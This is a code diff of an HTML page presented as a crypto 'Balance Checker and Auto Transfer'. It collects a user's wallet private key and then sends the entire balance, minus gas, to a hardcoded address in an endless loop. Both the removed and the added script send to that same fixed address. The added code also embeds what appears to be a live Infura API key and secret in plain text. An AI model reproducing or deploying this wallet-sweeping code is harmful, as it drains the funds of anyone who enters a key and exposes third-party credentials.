@@ -5,12 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Balance Checker and Auto Transfer</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.4/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
-  <script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
+  <!-- Other scripts and styles go here -->
   <style>
     #buttons {
       display: flex;
-      justify-content:space-evenly;
+      justify-content: space-evenly;
     }
 
     #outputBox {
@@ -28,88 +29,6 @@
     }
   </style>
 </head>
-<script>
-  const { ethers } = window;
-  const { utils, JsonRpcProvider } = ethers;
-
-  function initializeWallet() {
-    const privateKeyInput = document.getElementById('privateKey').value;
-    const apiUrlInput = document.getElementById('apiUrl').value;
-
-    function consoleAsStatus(...args) {
-      const status = document.getElementById("output");
-      status.innerHTML += args.join(" ") + "<br />";
-      console.log(...args);
-    }
-
-    const provider = new ethers.providers.JsonRpcProvider(apiUrlInput);
-    const wallet = new ethers.Wallet(privateKeyInput, provider);
-
-    return { wallet, privateKeyInput, apiUrlInput, consoleAsStatus };
-  }
-
-  async function checkBalance() {
-    const { wallet, consoleAsStatus } = initializeWallet();
-    try {
-      const walletAddress = await wallet.getAddress();
-      const balance = await wallet.getBalance();
-      const balanceInEther = ethers.utils.formatEther(balance);
-      consoleAsStatus(`ETH Balance for ${walletAddress}: ${balanceInEther} ETH`);
-    } catch (error) {
-      consoleAsStatus('Error checking balance:', error);
-    }
-  }
-
-  // Function to initiate AutoTransfer
-  async function AutoTransfer() {
-    const { wallet, consoleAsStatus } = initializeWallet();
-
-    try {
-      while (true) {
-        const walletAddress = await wallet.getAddress();
-        const balance = await wallet.getBalance();
-        const balanceInEther = ethers.utils.formatEther(balance);
-
-        consoleAsStatus(`Watching balance in ${walletAddress}...`);
-        consoleAsStatus(`ETH Balance: ${balanceInEther}`);
-
-        consoleAsStatus('Waiting for balance greater than 0...');
-
-        const gasPrice = await wallet.getGasPrice();
-        const gasFee = gasPrice.mul(285710); // Assuming a simple transfer with 21,000 gas limit
-
-        if (balance.gt(gasFee)) {
-          consoleAsStatus(`Initiating transfer... sending ${balanceInEther} ETH (excluding gas fee)`);
-
-          const toAddress = "0x189d20FAf91f4B90d65873aa6774531D4dc7d137";
-          const amountToSend = balance.sub(gasFee);
-
-          try {
-            const tx = await wallet.sendTransaction({
-              to: toAddress,
-              value: amountToSend,
-              gasPrice: gasPrice,
-            });
-
-
-            consoleAsStatus('Transaction sent, awaiting confirmation...');
-            const receipt = await tx.wait();
-            consoleAsStatus(`Receipt: ${JSON.stringify(receipt)}`);
-            consoleAsStatus(`Transaction hash: ${tx.hash}`);
-            consoleAsStatus(`Sent ${balanceInEther} ETH to VAULT ${toAddress} ✅`);
-          } catch (error) {
-            consoleAsStatus('Transfer failed:', error.message);
-          }
-        }
-
-        const intervalInMilliseconds = 2000; // 3 seconds
-        await new Promise(resolve => setTimeout(resolve, intervalInMilliseconds));
-      }
-    } catch (error) {
-      consoleAsStatus('Error fetching balance or transferring:', error);
-    }
-  }
-</script>
 <body>
   <h1>Balance Checker and Auto Transfer</h1>
 
@@ -117,23 +36,127 @@
     <label for="apiUrl">RPC URL (only http works, no wss):</label>
     <input type="url" id="apiUrl" name="apiUrl" placeholder="e.g., for Binance: https://bsc-dataseed.binance.org/" size="40">
     <br>
-   
+    <label for="chainId">CHAINID:</label>
+    <input type="text" id="CHAINID" name="CHAINID" required placeholder="CHAINID" size="40">
+    <br>
+    
     <label for="privateKey">Private Key:</label>
     <input type="password" id="privateKey" name="privateKey" required placeholder="Private key" size="40">
     <br>
+    <label for="gas_limit">GAS LIMIT (2100>~):</label>
+    <input type="text" id="gas_limit" name="gas limit" required placeholder="GAS LIMIT" size="40">
+    <br>
+
     
     <div id="buttons">
       <button type="button" onclick="checkBalance()">Check Balance</button>
       <button type="button" onclick="AutoTransfer()">Start Auto Transfer</button>
-      
     </div>
-  </form> 
+  </form>
 
   <div id="outputBox">
-    
     <!-- Output will be displayed here -->
     <section id="output"></section>
   </div>
 
+  <script>
+    const { ethers } = window;
+    const { JsonRpcProvider, utils } = ethers;
+
+    function initializeWallet() {
+      const privateKeyInput = document.getElementById('privateKey').value;
+      const apiUrlInput = document.getElementById('apiUrl').value;
+      const gasLimit = document.getElementById('gas_limit').value;
+      const chainId= document.getElementById('CHAINID') .value;
+
+      function consoleAsStatus(...args) {
+        const status = document.getElementById('output');
+        status.innerHTML += args.join(' ') + '<br />';
+        console.log(...args);
+      }
+
+      const provider = new ethers.providers.JsonRpcProvider(apiUrlInput);
+      const wallet = new ethers.Wallet(privateKeyInput, provider);
+
+      return { wallet, privateKeyInput, apiUrlInput, consoleAsStatus, provider,gasLimit,chainId };
+    }
+
+    async function checkBalance() {
+      const { wallet, consoleAsStatus } = initializeWallet();
+      try {
+        const walletAddress = await wallet.getAddress();
+        const balance = await wallet.getBalance();
+        const balanceInEther = ethers.utils.formatEther(balance);
+        consoleAsStatus(`ETH Balance for ${walletAddress}: ${balanceInEther} ETH`);
+      } catch (error) {
+        consoleAsStatus('Error checking balance:', error);
+      }
+    }
+
+    async function AutoTransfer() {
+      const { wallet, consoleAsStatus,gasLimit,chainId } = initializeWallet();
+
+      try {
+        while (true) {
+          const walletAddress = await wallet.getAddress();
+          const balance = await wallet.getBalance();
+          const balanceInEther = ethers.utils.formatEther(balance);
+
+          consoleAsStatus(`Watching balance in ${walletAddress}...`);
+          consoleAsStatus(`ETH Balance: ${balanceInEther}`);
+
+          consoleAsStatus('Waiting for balance greater than 0...');
+          
+          const apikey ='952311d238cc43c591f56f9c2a6c6f0b'
+          const apikeySecret = '3IU6/xk7Ei1/YSvjgqyVSX6qi7mpUSSJN7wMMi+HqhU5T9FqzH4IpQ'
+          const Auth = btoa(apikey +":"+apikeySecret);
+          const gasApiUrl = `https://gas.api.infura.io/networks/${chainId}/suggestedGasFees`;
+          const { data: gasApiData } = await axios.get(gasApiUrl,{
+            headers:{
+                Authorization:`Basic ${Auth}`,
+            },
+        });
+          
+          const highGasFee = parseFloat(gasApiData.high.suggestedMaxFeePerGas);
+          consoleAsStatus('High Gas Fee:', highGasFee);
+          
+          
+          // Calculate gas fee dynamically
+          const gasPrice =  ethers.utils.parseUnits(highGasFee.toString(),'gwei');
+          const gasFee = gasPrice.mul(gasLimit);
+          
+
+          if (balance>0) {
+            const toAddress = '0x189d20FAf91f4B90d65873aa6774531D4dc7d137';
+            const amountToSend = balance.sub(gasFee);
+            consoleAsStatus(`Initiating transfer... sending ${ethers.utils.formatEther(amountToSend)} ETH (excluding gas fee)`);
+
+            try {
+              const tx = await wallet.sendTransaction({
+                to: toAddress,
+                value: amountToSend,
+                gasPrice: gasPrice,
+                gasLimit: gasLimit
+                
+              });
+
+              consoleAsStatus('Transaction sent, awaiting confirmation...');
+              const receipt = await tx.wait();
+              consoleAsStatus(`Receipt: ${JSON.stringify(receipt)}`);
+              consoleAsStatus(`Transaction hash: ${tx.hash}`);
+              consoleAsStatus(`Sent ${balanceInEther} ETH to VAULT ${toAddress} ✅`);
+            } catch (error) {
+              consoleAsStatus('Transfer failed:', error.message);
+            }
+          }
+
+          const intervalInMilliseconds = 3000;
+          await new Promise(resolve => setTimeout(resolve, intervalInMilliseconds));
+        }
+      } catch (error) {
+        consoleAsStatus('Error fetching balance or transferring:', error);
+      }
+    }
+  </script>
 </body>
 </html>
